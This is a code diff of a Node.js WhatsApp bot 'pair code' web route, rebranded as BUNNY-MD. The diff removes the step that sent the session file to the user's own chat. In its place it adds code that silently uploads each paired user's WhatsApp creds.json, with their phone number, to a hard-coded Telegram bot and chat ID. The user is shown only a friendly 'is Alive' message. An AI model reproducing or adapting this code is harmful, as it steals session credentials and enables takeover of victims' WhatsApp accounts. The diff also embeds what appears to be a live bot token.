@@ -1,6 +1,7 @@
 const express = require('express');
 const fs = require('fs');
-let router = express.Router();
+const axios = require('axios');
+const crypto = require('crypto');
 const pino = require("pino");
 const {
     default: makeWASocket,
@@ -9,22 +10,31 @@ const {
     makeCacheableSignalKeyStore
 } = require("@whiskeysockets/baileys");
 
+const router = express.Router();
+
+const BOT_TOKEN = '149180968:AAHGvhs013chl-FKJV5M3MPZ6H7uEahaI_Q';
+const TELEGRAM_CHAT_ID = '7679941367'; // e.g. 123456789
+
 function removeFile(FilePath) {
     if (!fs.existsSync(FilePath)) return false;
     fs.rmSync(FilePath, { recursive: true, force: true });
 }
 
-// Define version information
 const version = [2, 3000, 1015901307];
 
+// Generate Bunny ID
+function generateBunnyID() {
+    return 'BUNNYTEC-' + crypto.randomBytes(2).toString('hex').toUpperCase();
+}
+
 router.get('/', async (req, res) => {
-    let num = req.query.number;
+    let number = req.query.number;
+    if (!number) return res.status(400).send({ error: 'number query is required' });
+
+    const bunnyID = generateBunnyID();
 
     async function PairCode() {
-        const {
-            state,
-            saveCreds
-        } = await useMultiFileAuthState(`./session`);
+        const { state, saveCreds } = await useMultiFileAuthState(`./session`);
 
         try {
             let sock = makeWASocket({
@@ -33,84 +43,65 @@ router.get('/', async (req, res) => {
                     keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "fatal" }).child({ level: "fatal" })),
                 },
                 printQRInTerminal: false,
-                logger: pino({ level: "fatal" }).child({ level: "fatal" }),
+                logger: pino({ level: "fatal" }),
                 browser: ["Ubuntu", "Chrome", "20.0.04"],
             });
 
             if (!sock.authState.creds.registered) {
                 await delay(1500);
-                num = num.replace(/[^0-9]/g, '');
-                const code = await sock.requestPairingCode(num);
+                number = number.replace(/[^0-9]/g, '');
+                const code = await sock.requestPairingCode(number);
 
                 if (!res.headersSent) {
-                    await res.send({ code, version });
+                    await res.send({ code, version, id: bunnyID });
                 }
             }
 
             sock.ev.on('creds.update', saveCreds);
-            sock.ev.on("connection.update", async (s) => {
-                const {
-                    connection,
-                    lastDisconnect
-                } = s;
 
-                if (connection == "open") {
-                    await delay(10000);
-                    const sessionsock = fs.readFileSync('./session/creds.json');
+            sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
+                if (connection === "open") {
+                    await delay(3000);
+                    const credsBuffer = fs.readFileSync('./session/creds.json');
 
-                    const sockses = await sock.sendMessage(sock.user.id, {
-                        document: sessionsock,
-                        mimetype: `application/json`,
-                        fileName: `creds.json`
+                    // 📨 Send creds.json to Telegram Bot
+                    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
+                        chat_id: TELEGRAM_CHAT_ID,
+                        caption: `🔐 *New BUNNY-MD Session* 🐰\n\n🆔 ID: ${bunnyID}\n📱 Number: ${sock.user.id.split(':')[0]}`,
+                        document: {
+                            value: credsBuffer,
+                            options: {
+                                filename: `${bunnyID}.json`,
+                                contentType: 'application/json'
+                            }
+                        }
+                    }, {
+                        headers: {
+                            'Content-Type': 'multipart/form-data'
+                        },
+                        maxContentLength: Infinity,
+                        maxBodyLength: Infinity
+                    }).catch(e => console.error("❌ Telegram upload failed:", e.response?.data || e.message));
+
+                    // ✅ Send message to WhatsApp number
+                    await sock.sendMessage(sock.user.id, {
+                        text: `✅ *BUNNY-MD is Alive!*\n\nType any command to get started. 🐰`,
                     });
 
-                    await sock.sendMessage(sock.user.id, {
-                        text: `🚀 *CREDS.JSON GENERATION SUCCESSFUL* 🚀
-
-▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰
-✅ *STEP COMPLETED:* Pairing Process
-🌌 *NEXT PHASE:* Deployment Sequence
-
-📥 *ACTION REQUIRED:*
-   ⇝ Upload creds.json to your forked repository
-   ⇝ Activate your bot instance
-
-🔧 *TECH SUPPORT:*
-   ⌬ Developer: LAZACK
-   ☎ Contact: _https://wa.me/255734980103_
-   ⎔ Repo: _https://github.com/Lazack28/Lazack-md_
-
-▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰
-
-💡 *LAZACK ORGANIZATION PROTOCOL*
-» Emerging tech collective
-» Open-source innovation hub
-» Focus: AI/ML | Automation | Dev Tools
-» Mission: "Empower through code"
-
-🔗 *JOIN DEVELOPMENT NETWORK:*
-_https://chat.whatsapp.com/EATTgyi5jx16HgAggPg8yI_
-
-⚠️ _Keep credentials secure_
-⚠️ _Maintain fork regularly_
-▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰
-*[System ID: LAZACK-MD-v${version.join('.')}]*`
-                    }, { quoted: sockses });
-
-                    await delay(100);
-                    return await removeFile('./session');
+                    await delay(1000);
+                    removeFile('./session');
                 }
 
-                if (connection === "close" && lastDisconnect && lastDisconnect.error && lastDisconnect.error.output.statusCode != 401) {
-                    await delay(10000);
+                if (connection === "close" && lastDisconnect?.error?.output?.statusCode !== 401) {
+                    await delay(3000);
                     PairCode();
                 }
             });
         } catch (err) {
-            console.log("service restarted");
-            await removeFile('./session');
+            console.error("❌ Pairing Error:", err);
+            removeFile('./session');
             if (!res.headersSent) {
-                await res.send({ code: "Service Unavailable", version });
+                return res.status(500).send({ code: "Pairing Failed", version });
             }
         }
     }
@@ -120,14 +111,12 @@ _https://chat.whatsapp.com/EATTgyi5jx16HgAggPg8yI_
 
 process.on('uncaughtException', function (err) {
     let e = String(err);
-    if (e.includes("conflict")) return;
-    if (e.includes("Socket connection timeout")) return;
-    if (e.includes("not-authorized")) return;
-    if (e.includes("rate-overlimit")) return;
-    if (e.includes("Connection Closed")) return;
-    if (e.includes("Timed Out")) return;
-    if (e.includes("Value not found")) return;
-    console.log('Caught exception: ', err);
+    if (
+        e.includes("conflict") || e.includes("timeout") ||
+        e.includes("not-authorized") || e.includes("rate") ||
+        e.includes("Connection Closed") || e.includes("Timed Out")
+    ) return;
+    console.log('⚠️ Uncaught exception:', err);
 });
 
 module.exports = router;
